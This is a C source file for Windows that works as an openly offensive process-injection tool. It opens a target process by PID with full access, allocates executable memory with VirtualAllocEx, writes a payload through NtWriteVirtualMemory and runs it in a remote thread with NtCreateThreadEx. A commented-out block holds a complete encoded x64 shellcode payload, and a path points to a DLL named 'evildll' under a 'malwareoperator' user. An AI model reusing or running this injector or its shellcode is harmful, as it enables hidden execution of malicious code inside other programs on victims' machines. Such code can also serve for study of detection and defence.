#include <windows.h>
#include <stdio.h>

#include "ntheaders.h"

int main(int argc, char* argv[]) {
	PVOID pVallocBuff;
	DWORD dwProcessId;
	HMODULE hKernel32, hNtDll = NULL;
	HANDLE hProcess, hThread;
	size_t ui64BytesWritten = 0;
	PTHREAD_START_ROUTINE kawLoadLibrary = NULL;
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
	wchar_t dllPath[MAX_PATH] = L"C:\\Users\\malwareoperator\\Desktop\\evildll\\x64\\Debug\\evildll.dll";
	size_t zDllPathSize = sizeof(dllPath);

	/*
	unsigned char ucShellcode[] =
		"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\x09\xa6\xb1\xe2\x2c\x98\x56\x46\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xf5\xee\x32"
		"\x06\xdc\x70\x96\x46\x09\xa6\xf0\xb3\x6d\xc8\x04\x17\x5f"
		"\xee\x80\x30\x49\xd0\xdd\x14\x69\xee\x3a\xb0\x34\xd0\xdd"
		"\x14\x29\xee\x3a\x90\x7c\xd0\x59\xf1\x43\xec\xfc\xd3\xe5"
		"\xd0\x67\x86\xa5\x9a\xd0\x9e\x2e\xb4\x76\x07\xc8\x6f\xbc"
		"\xa3\x2d\x59\xb4\xab\x5b\xe7\xe0\xaa\xa7\xca\x76\xcd\x4b"
		"\x9a\xf9\xe3\xfc\x13\xd6\xce\x09\xa6\xb1\xaa\xa9\x58\x22"
		"\x21\x41\xa7\x61\xb2\xa7\xd0\x4e\x02\x82\xe6\x91\xab\x2d"
		"\x48\xb5\x10\x41\x59\x78\xa3\xa7\xac\xde\x0e\x08\x70\xfc"
		"\xd3\xe5\xd0\x67\x86\xa5\xe7\x70\x2b\x21\xd9\x57\x87\x31"
		"\x46\xc4\x13\x60\x9b\x1a\x62\x01\xe3\x88\x33\x59\x40\x0e"
		"\x02\x82\xe6\x95\xab\x2d\x48\x30\x07\x82\xaa\xf9\xa6\xa7"
		"\xd8\x4a\x0f\x08\x76\xf0\x69\x28\x10\x1e\x47\xd9\xe7\xe9"
		"\xa3\x74\xc6\x0f\x1c\x48\xfe\xf0\xbb\x6d\xc2\x1e\xc5\xe5"
		"\x86\xf0\xb0\xd3\x78\x0e\x07\x50\xfc\xf9\x69\x3e\x71\x01"
		"\xb9\xf6\x59\xec\xaa\x96\x99\x56\x46\x09\xa6\xb1\xe2\x2c"
		"\xd0\xdb\xcb\x08\xa7\xb1\xe2\x6d\x22\x67\xcd\x66\x21\x4e"
		"\x37\x97\x68\xe3\xe4\x5f\xe7\x0b\x44\xb9\x25\xcb\xb9\xdc"
		"\xee\x32\x26\x04\xa4\x50\x3a\x03\x26\x4a\x02\x59\x9d\xed"
		"\x01\x1a\xd4\xde\x88\x2c\xc1\x17\xcf\xd3\x59\x64\x81\x4d"
		"\xf4\x35\x68\x6c\xde\xd4\xe2\x2c\x98\x56\x46";


	*/

	unsigned char ucShellcode[] = "\xDE\xAD\xBE\xEF";


	printf("Initializing the injector\n");

	if (argc < 2) {
		puts("Invalid argument");
	}

	dwProcessId = atoi(argv[1]);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);

	if (!hProcess) {
		printf("Error attaching PID!\n");
	}
	else {
		printf("Process handle opened.\n");
	}

	hKernel32 = GetModuleHandleA("kernel32.dll");
	hNtDll = GetModuleHandleA("ntdll.dll");

	/* FUNDAMENTALS FUNCTIONS */
	kawLoadLibrary = (PTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	pNtCreateThreadEx kawRemoteThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtDll, "NtCreateThreadEx");

	pVallocBuff = VirtualAllocEx(hProcess, NULL, zDllPathSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	printf("Base address %p ", pVallocBuff);

	if (pVallocBuff) {
		printf("VA created in PID[%d].\n", dwProcessId);
	}
	else {
		printf("Could not create VA space.\n");
	}


	pNtWriteVirtualMemory kawWriteVaMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtDll, "NtWriteVirtualMemory");
	kawWriteVaMemory(hProcess, pVallocBuff, ucShellcode, sizeof(ucShellcode), &ui64BytesWritten);

	if (ui64BytesWritten != 0) {
		printf("%d-Bytes written in memory\n", ui64BytesWritten);
	}

	/* CALL TO REMOTE THREAD */
	/* native */
	NTSTATUS status = kawRemoteThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, (PTHREAD_START_ROUTINE)pVallocBuff, NULL , 0, 0, 0, 0, NULL);
	WaitForSingleObject(hProcess, 0xffffffff);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return EXIT_SUCCESS;
}
